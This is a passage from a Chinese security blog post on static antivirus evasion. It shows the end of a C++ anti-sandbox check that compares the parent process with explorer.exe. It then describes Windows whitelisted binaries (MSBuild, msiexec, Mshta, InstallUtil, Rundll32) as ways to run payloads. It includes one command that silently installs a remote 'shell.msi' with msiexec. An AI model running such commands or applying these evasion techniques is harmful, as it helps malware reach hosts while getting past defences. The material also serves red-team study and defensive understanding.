class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD explorer_id = <span class="built_in">get_explorer_processid</span>();</span><br><span class="line">    DWORD parent_id = <span class="built_in">get_parent_processid</span>(<span class="built_in">GetCurrentProcessId</span>());</span><br><span class="line">    <span class="keyword">if</span> (explorer_id == parent_id) </span><br><span class="line">    &#123; <span class="comment">/* 判断父进程id是否和explorer进程id相同&#123; */</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;Not sandbox&quot;</span>, <span class="string">L&quot;Success&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二开cs环境准备"><a href="#二开cs环境准备" class="headerlink" title="二开cs环境准备"></a>二开cs环境准备</h2><p>参考:</p>
<p><a target="_blank" rel="noopener" href="https://www.ol4three.com/2021/11/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltStrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2/">https://www.ol4three.com/2021/11/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltStrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2/</a></p>
<h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><h3 id="一、MSBuild-exe介绍"><a href="#一、MSBuild-exe介绍" class="headerlink" title="一、MSBuild.exe介绍"></a>一、MSBuild.exe介绍</h3><p>Microsoft Build Engine是一个用于构建应用程序的平台，此引擎也被称为msbuild，它为项目文件提供一个XML模式，该模式控制构建平台如何处理和构建软件。Visual Studio使用MSBuild，但它不依赖于Visual Studio。通过在项目或解决方案文件中调用msbuild.exe，可以在未安装Visual Studio的环境中编译和生成程序。</p>
<p>说明：Msbuild.exe所在路径没有被系统添加PATH环境变量中，因此，Msbuild命令无法直接在cmd中使用。需要带上路径：C:\Windows\Microsoft.NET\Framework\v4.0.30319。</p>
<p>适用条件:.NET Framework&gt;&#x3D;4.0</p>
<p>xml配置文件写法：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LyShark/p/11331476.html">https://www.cnblogs.com/LyShark/p/11331476.html</a></p>
<p><a target="_blank" rel="noopener" href="https://micro8.gitbook.io/micro8/contents-1/71-80/71-ji-yu-bai-ming-dan-msbuild.exe-zhi-hang-payload-di-yi-ji">https://micro8.gitbook.io/micro8/contents-1/71-80/71-ji-yu-bai-ming-dan-msbuild.exe-zhi-hang-payload-di-yi-ji</a></p>
<p><a target="_blank" rel="noopener" href="https://pplsec.github.io/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">https://pplsec.github.io/2019/03/26/MSBuild.exe-bypass-application-whitelisting/</a></p>
<p><a target="_blank" rel="noopener" href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/197706.html">https://www.freebuf.com/articles/network/197706.html</a></p>
<h3 id="二、msiexec-exe介绍"><a href="#二、msiexec-exe介绍" class="headerlink" title="二、msiexec.exe介绍"></a>二、msiexec.exe介绍</h3><p>看到msiexec可能还有点陌生，但说道.msi可能就比较熟悉了，在windows下很多软件安装就是.msi格式的。当Windows操作系统安装了Windows Installer引擎，而MSI软件包使用该引擎来 安装应用程序，解释包和安装产品的可执行程序就是我们这用到 的Msiexec.exe。</p>
<p>之前在介绍免杀工具的时候有些工具就可以生成msi格式的payload，比如专题6介绍的venom：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CbfxupSWEPB86tBZsmxNCQ,%E5%85%B6%E5%AE%9Emsfvenom%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%9F%E6%88%90msi%E6%A0%BC%E5%BC%8F%E7%9A%84payload%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%9F%A5%E6%9D%80%E7%9A%84%E6%AF%94%E8%BE%83%E5%8E%89%E5%AE%B3%E4%BA%86%E3%80%82">https://mp.weixin.qq.com/s/CbfxupSWEPB86tBZsmxNCQ,其实msfvenom也可以生成msi格式的payload，不过被杀软查杀的比较厉害了。</a></p>
<p>msi文件可以双击执行，也可以命令行静默执行，而且msiexec也同样支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i http://www.tidesec.com/shell/shell.msi</span><br></pre></td></tr></table></figure>

<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/10493910.html">https://www.cnblogs.com/backlion/p/10493910.html</a></p>
<p><a target="_blank" rel="noopener" href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a></p>
<h3 id="三、Mshta-exe介绍"><a href="#三、Mshta-exe介绍" class="headerlink" title="三、Mshta.exe介绍"></a>三、Mshta.exe介绍</h3><p><font style="color:rgb(36, 41, 46);">Mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。<br></font><font style="color:rgb(36, 41, 46);">目前正常的hta文件用到的很少，偶尔见到了很可能就是恶意软件，很多免杀工具都是对shellcode进行处理后生产.hta文件，在windows下可以直接执行。<br></font>之前工具篇里多个工具都可以生成hta后门：</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/10491616.html">https://www.cnblogs.com/backlion/p/10491616.html</a>（多种方法）</p>
<h3 id="四、InstallUtil-exe介绍"><a href="#四、InstallUtil-exe介绍" class="headerlink" title="四、InstallUtil.exe介绍"></a>四、InstallUtil.exe介绍</h3><p>InstallUtil.exe算是免杀白名单里使用比较多的一个了，InstallUtil.exe可以用于安装有.NET开发的所有应用安装程序，如果要使用 .NET Framework 开发 Windows 服务，则可以使用installutil.exe命令行快速安装服务应用程序。</p>
<p>利用过程参考：</p>
<p><a target="_blank" rel="noopener" href="https://pplsec.github.io/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/">https://pplsec.github.io/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/</a></p>
<p><a target="_blank" rel="noopener" href="http://wiki.tidesec.com/docs/bypassav">http://wiki.tidesec.com/docs/bypassav</a>（专题36）</p>
<h3 id="五、Rundll32-exe介绍"><a href="#五、Rundll32-exe介绍" class="headerlink" title="五、Rundll32.exe介绍"></a>五、Rundll32.exe介绍</h3><p>Rundll32.exe，可以执行32位的DLL文件，以命令行的方式调用动态链接程序库。。它的作用是执行DLL文件中的内部函数，这样在进程当中，只会有Rundll32.exe，而不会有DLL后门的进程，这样就实现了进程上的隐藏。系统中还有一个Rundll.exe文件，可以执行16位的DLL文件。</p>
<p>DLL文件对于Window的操作系统非常重要，它还决定了自定义Windows的其他程序的运行。动态链接库（DLL）文件是一种文件类型，它向其他程序提供有关如何调用某些内容的指令。因此，多个软件甚至可以同时共享这样的DLL文件。尽管与.exe文件的格式相同,但DLL文件不能像.exe文件那样直接执行。dll文件扩展名可以是：.dll（动态链接库）、.ocx（ActiveX控件）、.cpl（控制面板）、.drv（设备驱动程序）。</p>
<p>Rundll32.exe令行下的使用方法为：Rundll32.exe DLLname,Functionname,需注意x86，x64位的Rundll32调用，64位的系统默认调用的是64位Rundll32.exe(在C:\Windows\System32目录下)。</p>
<p>Windows 7 默认位置：</p>
<p>64位 C:\Windows\System32\rundll32.exe </p>
<p>32位 C:\Windows\SysWOW64\rundll32.exe</p>
<p>利用方式可以参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/10488747.html">https://www.cnblogs.com/backlion/p/10488747.html</a></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/link/">Friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode-loader"><span class="toc-number">1.</span> <span class="toc-text">shellcode loader</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E5%8F%98%E5%BC%82%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E5%9B%9E%E8%B0%83%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">shellcode变异加密混淆回调执行代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.1.</span> <span class="toc-text">python加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HEX%E5%8A%A0%E5%AF%86"><span class="toc-number">3.1.1.</span> <span class="toc-text">HEX加密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Base64%E6%B7%B7%E6%B7%86"><span class="toc-number">3.1.2.</span> <span class="toc-text">Base64混淆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AES%E6%B7%B7%E6%B7%86"><span class="toc-number">3.1.3.</span> <span class="toc-text">AES混淆</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E6%89%93%E5%8C%85%E5%99%A8%E9%80%89%E6%8B%A9-Pyinstall-Py2exe-Nuitka"><span class="toc-number">3.2.</span> <span class="toc-text">#Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#py2exe"><span class="toc-number">3.2.1.</span> <span class="toc-text">py2exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nuitka"><span class="toc-number">3.2.2.</span> <span class="toc-text">Nuitka</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.3.</span> <span class="toc-text">C++加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.1.</span> <span class="toc-text">函数指针执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.3.2.</span> <span class="toc-text">动态内存加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4"><span class="toc-number">3.3.3.</span> <span class="toc-text">内联汇编指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E6%8C%87%E4%BB%A4"><span class="toc-number">3.3.4.</span> <span class="toc-text">伪指令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.4.</span> <span class="toc-text">go加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-1"><span class="toc-number">3.4.1.</span> <span class="toc-text">动态内存加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E8%81%94C%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.4.2.</span> <span class="toc-text">内联C加载</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell"><span class="toc-number">3.5.</span> <span class="toc-text">powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80"><span class="toc-number">3.5.0.1.</span> <span class="toc-text">分离免杀</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerShell-%E6%96%87%E4%BB%B6%E6%A8%A1%E5%BC%8F-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9%E8%BF%87DeFender%EF%BC%88%E8%BF%87%E4%B8%8D%E4%BA%86%E7%81%AB%E7%BB%92%EF%BC%89"><span class="toc-number">3.5.1.</span> <span class="toc-text">PowerShell-文件模式-特征修改过DeFender（过不了火绒）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E5%85%8D%E6%9D%80%E7%BB%95%E8%BF%87"><span class="toc-number">3.6.</span> <span class="toc-text">汇编代码免杀绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E5%85%8D%E6%9D%80%EF%BC%88%E9%9D%99%E6%80%81%EF%BC%89"><span class="toc-number">3.7.</span> <span class="toc-text">java免杀（静态）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby%E5%85%8D%E6%9D%80%EF%BC%9A"><span class="toc-number">3.8.</span> <span class="toc-text">Ruby免杀：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%EF%BC%88%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB%EF%BC%89"><span class="toc-number">3.9.</span> <span class="toc-text">无文件落地（加载器分离）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-File-%E5%B0%86shellcode%E4%BB%8E%E6%96%87%E6%9C%AC%E4%B8%AD%E6%8F%90%E5%8F%96"><span class="toc-number">3.9.1.</span> <span class="toc-text">Python-File-将shellcode从文本中提取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-Argv-%E5%B0%86shellcode%E4%B8%8E%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB"><span class="toc-number">3.9.2.</span> <span class="toc-text">Python-Argv-将shellcode与加载器分离</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-Http-%E5%B0%86shellcode%E7%94%A8%E8%BF%9C%E7%A8%8B%E5%8D%8F%E8%AE%AE%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.9.3.</span> <span class="toc-text">Python-Http-将shellcode用远程协议加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-Socket-%E5%B0%86shellcode%E9%80%9A%E8%BF%87%E7%AE%A1%E9%81%93%E4%BC%A0%E8%BE%93"><span class="toc-number">3.9.4.</span> <span class="toc-text">Python-Socket-将shellcode通过管道传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-Images-%E5%B0%86shellcode%E9%9A%90%E5%86%99%E8%BF%9B%E5%9B%BE%E7%89%87%E5%86%85"><span class="toc-number">3.9.5.</span> <span class="toc-text">Python-Images-将shellcode隐写进图片内</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UUID%E8%BD%AC%E6%8D%A2shellcode%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E5%85%8D%E6%9D%80"><span class="toc-number">3.10.</span> <span class="toc-text">UUID转换shellcode写入内存免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#c-uuid%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.10.1.</span> <span class="toc-text">c++ uuid加载器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8python2%E8%84%9A%E6%9C%AC%E5%B0%86shellcode%E8%BD%AC%E6%8D%A2%E6%88%90uuid"><span class="toc-number">3.10.2.</span> <span class="toc-text">利用python2脚本将shellcode转换成uuid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python2-uuid%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.10.3.</span> <span class="toc-text">python2 uuid加载器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python-mac%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.10.4.</span> <span class="toc-text">python mac内存加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python-ipv4%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.10.5.</span> <span class="toc-text">python ipv4内存加载器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python-ipv6%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.10.6.</span> <span class="toc-text">python ipv6内存加载器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nim-shellcode%E5%85%8D%E6%9D%80"><span class="toc-number">4.</span> <span class="toc-text">nim shellcode免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E5%BE%81%E7%A0%81%E4%BF%AE%E6%94%B9-%E2%80%93%E8%8A%B1%E6%8C%87%E4%BB%A4%E6%B7%BB%E5%8A%A0-%E2%80%94upx%E5%8A%A0%E5%A3%B3"><span class="toc-number">5.</span> <span class="toc-text">特征码修改 –花指令添加 —upx加壳</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81"><span class="toc-number">6.</span> <span class="toc-text">DLL劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall%E5%85%8D%E6%9D%80%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-number">7.</span> <span class="toc-text">syscall免杀介绍：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E6%B2%99%E7%AE%B1%E6%A3%80%E6%B5%8B"><span class="toc-number">8.</span> <span class="toc-text">反沙箱检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%BC%80cs%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">9.</span> <span class="toc-text">二开cs环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">10.</span> <span class="toc-text">白名单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81MSBuild-exe%E4%BB%8B%E7%BB%8D"><span class="toc-number">10.1.</span> <span class="toc-text">一、MSBuild.exe介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81msiexec-exe%E4%BB%8B%E7%BB%8D"><span class="toc-number">10.2.</span> <span class="toc-text">二、msiexec.exe介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81Mshta-exe%E4%BB%8B%E7%BB%8D"><span class="toc-number">10.3.</span> <span class="toc-text">三、Mshta.exe介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81InstallUtil-exe%E4%BB%8B%E7%BB%8D"><span class="toc-number">10.4.</span> <span class="toc-text">四、InstallUtil.exe介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81Rundll32-exe%E4%BB%8B%E7%BB%8D"><span class="toc-number">10.5.</span> <span class="toc-text">五、Rundll32.exe介绍</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&text=静态免杀入门"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&title=静态免杀入门"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&is_video=false&description=静态免杀入门"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=静态免杀入门&body=Check out this article: https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&title=静态免杀入门"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&title=静态免杀入门"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&title=静态免杀入门"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&title=静态免杀入门"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&name=静态免杀入门&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/&t=静态免杀入门"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    Oceanzbz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
      <ul>
        
          <!-- 不蒜子统计 -->
          <span id="busuanzi_container_site_pv">
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
          </span>
          <span class="post-meta-divider">|</span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                  本站访客数<span id="busuanzi_value_site_uv"></span>人
          </span>
          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-QWTJSPQL4F');
</script>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
